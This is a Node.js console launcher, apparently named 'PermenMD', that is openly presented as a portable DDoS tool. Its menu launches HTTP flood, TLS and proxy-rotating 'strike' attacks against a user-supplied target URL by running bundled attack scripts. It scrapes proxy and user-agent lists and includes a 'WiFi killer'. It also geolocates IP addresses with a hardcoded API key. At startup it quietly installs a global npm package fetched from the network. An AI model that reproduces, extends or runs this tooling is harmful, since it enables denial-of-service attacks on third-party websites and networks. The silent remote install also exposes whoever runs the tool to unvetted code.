#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '2.0.2'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function banner() {
console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                    Portable Tools DDoS By PermenMD
========================================================================`)}

async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}

function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}

function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}

async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i -g permenmd-wifi`)
    await exec(`npm i axios tls http2 hpack net cluster crypto`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/sigma.txt');
    const password = await secretBangetJir.text();

    permen.question('[\x1b[1m\x1b[31mPermenMD Security\x1b[0m]: \x1b[8m', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome Back Sir`)
        await sleep(1000)
		    banner()
        sigma()
      } else {
        console.log(`Wrong Password`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}

async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`Started wifi process with PID: ${startKillwiFi.pid}`);
permen.question('[\x1b[1m\x1b[31mPermenMD Wifi Killer\x1b[0m]: \x1b[8m', async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`WiFi Killer Has Ended`)
  sigma()
} else {
  console.log(`do you mean 'exit'?`)
  sigma()
}})
}
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                      Tracking IP Address Result 
========================================================================
 - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};

async function pushOngoing(methods, duration) {
  const startTime = Date.now();
  processList.push({ methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}

function ongoingAttack() {
  console.log("\nCurrent process list:\n");
  processList.forEach((process) => {
    console.log(`  ${process.methods} (started ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago)\n`);
  });
}

async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args

const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
                      Attack Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : ${methods}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)

const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
  pushOngoing(methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 4`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 30 90 proxy.txt --full --randrate`)
      sigma()
      } else if (methods === 'rape') {
        console.log(`Not Available Right Now`)
        sigma()
        } else if (methods === 'vps-killer') {
          console.log(`Not Available Right Now`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};


async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By PermenMD

Thx To:
ChatGPT ( Fixing Error )
IrfanNotSepuh ( Gatau Ngapain )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
YouTube ( Music )
Allah SWT
`
permen.question('[\x1b[1m\x1b[32mPermenMD Console\x1b[0m]: ', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
| methods   | show list of available methods
| track-ip  | track ip address with info
| kill-wifi | kill your wifi (termux/linux/windows only)
| attack    | launch ddos attack
| ongoing   | show ongoing attack
| news      | show latest permenmd news
| credits   | show creator of these tools
| clear     | clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[=========================================]
|| flood      || HTTP(s) Flood DoS
|| tls        || TLS 1.3 
|| strike     || Best DDoS methods
|| rape       || Basic DDoS methods
|| vps-killer || Digital Ocean Killer
[=========================================]
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}

function clearall() {
  clearProxy()
  clearUserAgent()
}
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()